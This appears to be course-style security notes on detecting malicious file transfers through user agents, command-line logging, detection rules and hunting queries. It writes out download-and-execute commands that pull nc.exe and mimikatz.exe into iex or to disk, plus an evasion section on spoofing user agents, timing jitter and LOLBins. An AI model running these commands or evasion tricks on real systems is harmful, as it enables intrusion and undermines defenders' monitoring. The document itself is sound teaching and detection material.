# File Transfer Detection

## Overview

Detection of malicious file transfers is crucial for security teams to identify potential threats. This document covers various detection methods and techniques for identifying suspicious file transfer activities.

## Command-Line Detection

### Blacklisting vs Whitelisting

**Blacklisting:**
- Command-line detection based on blacklisting is straightforward to bypass
- Even simple case obfuscation can defeat blacklist-based detection
- Not recommended as primary detection method

**Whitelisting:**
- Process of whitelisting all command lines in environment is initially time-consuming
- Very robust detection method once implemented
- Allows for quick detection and alerting on unusual command lines
- Recommended approach for mature security environments

## User Agent Detection

### Background

Most client-server protocols require negotiation before exchanging information. HTTP clients are identified by their user agent strings, which servers use to identify connecting clients (Firefox, Chrome, cURL, Python scripts, sqlmap, Nmap, etc.).

### Building User Agent Baselines

Organizations should build lists of:
- Known legitimate user agent strings
- User agents used by default operating system processes
- Common user agents used by update services (Windows Update, antivirus updates)
- Feed these into SIEM tools for threat hunting
- Filter out legitimate traffic to focus on anomalies

### Useful Resources

- [User Agent String Database](https://www.useragentstring.com/) - Handy for identifying common user agent strings
- [User Agent String List](https://developers.whatismybrowser.com/useragents/explore/) - Comprehensive list of user agent strings

## Common Transfer Method Detection

### Invoke-WebRequest Detection

**Client Commands:**
```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```

**Server Detection:**
```http
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```

### WinHttpRequest Detection

**Client Commands:**
```powershell
$h=new-object -com WinHttp.WinHttpRequest.5.1;
$h.open('GET','http://10.10.10.32/nc.exe',$false);
$h.send();
iex $h.ResponseText
```

**Server Detection:**
```http
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```

### Msxml2 Detection

**Client Commands:**
```powershell
$h=New-Object -ComObject Msxml2.XMLHTTP;
$h.open('GET','http://10.10.10.32/nc.exe',$false);
$h.send();
iex $h.responseText
```

**Server Detection:**
```http
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```

### Certutil Detection

**Client Commands:**
```cmd
certutil -urlcache -split -f http://10.10.14.55:8085/mimikatz.exe
certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```

**Server Detection:**
```http
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
```

### BITS Detection

**Client Commands:**
```powershell
Import-Module bitstransfer;
Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
$r=gc $env:temp\t;
rm $env:temp\t;
iex $r
```

**Server Detection:**
```http
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
```

## Detection Strategies

### 1. Binary Whitelisting/Blacklisting

**Whitelist Approach:**
- Create list of approved binaries for file transfers
- Monitor for any transfers using non-approved binaries
- More restrictive but more secure

**Blacklist Approach:**
- Maintain list of binaries known to be used maliciously
- Monitor for usage of blacklisted binaries
- Easier to implement but less comprehensive

### 2. User Agent Anomaly Detection

**Baseline Creation:**
- Document all legitimate user agents in environment
- Include operating system processes and updates
- Regular updates to baseline as environment changes

**Anomaly Detection:**
- Monitor for unusual or suspicious user agent strings
- Look for common penetration testing tool signatures
- Investigate any user agents not in baseline

### 3. Network Traffic Analysis

**HTTP Traffic Monitoring:**
- Monitor for suspicious HTTP requests
- Look for requests to unusual ports or protocols
- Analyze request patterns and timing

**DNS Monitoring:**
- Monitor for DNS requests to suspicious domains
- Look for DNS tunneling attempts
- Monitor for requests to known malicious domains

### 4. Process Monitoring

**Command Line Monitoring:**
- Monitor for suspicious command line arguments
- Look for base64 encoded content in commands
- Monitor for PowerShell execution policies changes

**Process Creation:**
- Monitor for unusual process creation patterns
- Look for processes spawned from suspicious parents
- Monitor for processes with unusual network connections

## SIEM Integration

### Log Sources

**Windows Event Logs:**
- Security logs for authentication events
- System logs for process creation
- Application logs for specific applications

**Network Logs:**
- Firewall logs for connection attempts
- Proxy logs for web traffic
- DNS logs for domain requests

### Detection Rules

**User Agent Rules:**
```
alert http any any -> any any (msg:"Suspicious PowerShell User Agent"; 
content:"WindowsPowerShell"; http_header; sid:1000001;)

alert http any any -> any any (msg:"Certutil User Agent Detected"; 
content:"Microsoft-CryptoAPI"; http_header; sid:1000002;)

alert http any any -> any any (msg:"BITS Transfer Detected"; 
content:"Microsoft BITS"; http_header; sid:1000003;)
```

**Command Line Rules:**
```
Event ID 4688 (Process Creation) with suspicious commands:
- certutil -urlcache
- powershell -encodedcommand
- bitsadmin /transfer
```

## Threat Hunting Techniques

### 1. User Agent Hunting

**PowerShell Query:**
```powershell
# Search for suspicious user agents in web logs
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-WinHTTP/Analytic'} | 
Where-Object {$_.Message -like "*WindowsPowerShell*" -or $_.Message -like "*CryptoAPI*"}
```

**Splunk Query:**
```splunk
index=web_logs | regex user_agent="(WindowsPowerShell|CryptoAPI|Microsoft BITS)" | stats count by user_agent, src_ip
```

### 2. Command Line Hunting

**Look for base64 encoded PowerShell:**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} | 
Where-Object {$_.Message -like "*-encodedcommand*" -or $_.Message -like "*-enc*"}
```

**Search for file transfer utilities:**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} | 
Where-Object {$_.Message -like "*certutil*" -or $_.Message -like "*bitsadmin*"}
```

### 3. Network Hunting

**Look for suspicious connections:**
```powershell
# Monitor for connections to unusual ports
Get-NetTCPConnection | Where-Object {$_.RemotePort -notin @(80,443,22,3389)}
```

**DNS hunting:**
```powershell
# Look for DNS requests to suspicious domains
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-DNS-Client/Operational'} | 
Where-Object {$_.Message -like "*suspicious-domain.com*"}
```

## Advanced Detection Techniques

### 1. Behavioral Analysis

**File Creation Patterns:**
- Monitor for files created in unusual locations
- Look for executable files downloaded to temp directories
- Monitor for files with suspicious extensions

**Network Behavior:**
- Monitor for unusual outbound connections
- Look for connections to known malicious IPs
- Monitor for data exfiltration patterns

### 2. Machine Learning Detection

**Anomaly Detection:**
- Train models on normal file transfer patterns
- Detect deviations from normal behavior
- Reduce false positives through continuous learning

**User Behavior Analytics:**
- Monitor for users performing unusual file transfers
- Look for transfers outside normal business hours
- Monitor for transfers to unusual destinations

### 3. Threat Intelligence Integration

**IOC Matching:**
- Compare user agents against known malicious signatures
- Check domains against threat intelligence feeds
- Monitor for known malicious file hashes

**Attribution:**
- Link detected activity to known threat actors
- Identify campaign patterns and techniques
- Enhance detection based on threat actor TTPs

## Best Practices

### 1. Layered Detection

- Implement multiple detection methods
- Don't rely on single detection technique
- Combine network, host, and behavioral detection

### 2. Continuous Monitoring

- Monitor file transfer activity 24/7
- Implement real-time alerting
- Regular review and tuning of detection rules

### 3. Regular Updates

- Keep user agent baselines current
- Update detection rules regularly
- Incorporate new threat intelligence

### 4. Response Planning

- Develop incident response procedures
- Plan for containment and eradication
- Practice response scenarios regularly

## Evading Detection

### Changing User Agent

If administrators have blacklisted specific user agents, `Invoke-WebRequest` contains a `UserAgent` parameter that allows changing the default user agent to emulate different browsers. This can make requests appear legitimate.

### Listing Available User Agents

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

**Available User Agents:**
- **InternetExplorer:** `Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)`
- **FireFox:** `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0`
- **Chrome:** `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6`
- **Opera:** `Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1`
- **Safari:** `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16`

### Using Chrome User Agent

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

**Server Detection (with Chrome User Agent):**
```http
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
```

### LOLBAS / GTFOBins

Application whitelisting may prevent using PowerShell or Netcat, and command-line logging may alert defenders. In such cases, "LOLBIN" (Living Off The Land Binary) or "misplaced trust binaries" can be used.

**Example - Intel Graphics Driver:**
```powershell
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

**Benefits of LOLBins:**
- May be permitted by application whitelisting
- Often excluded from alerting systems
- Appear as legitimate system processes
- Difficult to detect without proper monitoring

**Resources:**
- **LOLBAS Project:** Windows Living Off The Land Binaries
- **GTFOBins Project:** Linux equivalent (~40 binaries for file transfers)

### Additional Evasion Techniques

**Custom User Agent Strings:**
```powershell
$CustomAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $CustomAgent -OutFile "C:\Users\Public\nc.exe"
```

**Randomized User Agents:**
```powershell
$agents = @(
    [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome,
    [Microsoft.PowerShell.Commands.PSUserAgent]::Firefox,
    [Microsoft.PowerShell.Commands.PSUserAgent]::Safari
)
$randomAgent = $agents | Get-Random
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $randomAgent -OutFile "C:\Users\Public\nc.exe"
```

**Timing Evasion:**
```powershell
# Add delays to avoid pattern detection
Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

### Common Evasion Strategies

1. **User Agent Rotation:** Rotate between different legitimate user agents
2. **Timing Variation:** Add random delays between requests
3. **Request Headers:** Modify additional headers to appear legitimate
4. **Alternative Binaries:** Use LOLBins when standard tools are blocked
5. **Protocol Switching:** Switch between HTTP/HTTPS/FTP as needed
6. **Fragmentation:** Split large files into smaller chunks
7. **Encoding:** Use base64 or other encoding methods

### Detection Countermeasures

**For Defenders:**
- Monitor for unusual user agent patterns
- Implement behavioral analysis beyond user agent strings
- Monitor process creation and command line arguments
- Implement application whitelisting properly
- Log and monitor all network connections
- Use machine learning for anomaly detection

**For Penetration Testers:**
- Test multiple evasion techniques
- Verify detection capabilities during engagements
- Document successful evasion methods
- Practice with different LOLBins/GTFOBins
- Understand defensive measures in target environment

## Conclusion

Detecting malicious file transfers requires a multi-layered approach combining user agent analysis, command-line monitoring, network traffic analysis, and behavioral detection. However, attackers can employ various evasion techniques including user agent modification, LOLBins, and timing variations.

Organizations should implement comprehensive monitoring and hunting capabilities while understanding that determined attackers will attempt to evade detection. This cat-and-mouse game requires continuous improvement of both offensive and defensive capabilities.

This detection capability should be integrated into broader security operations and threat hunting programs to maximize effectiveness and reduce response times. Regular testing and practice with both detection and evasion techniques are essential for security professionals. 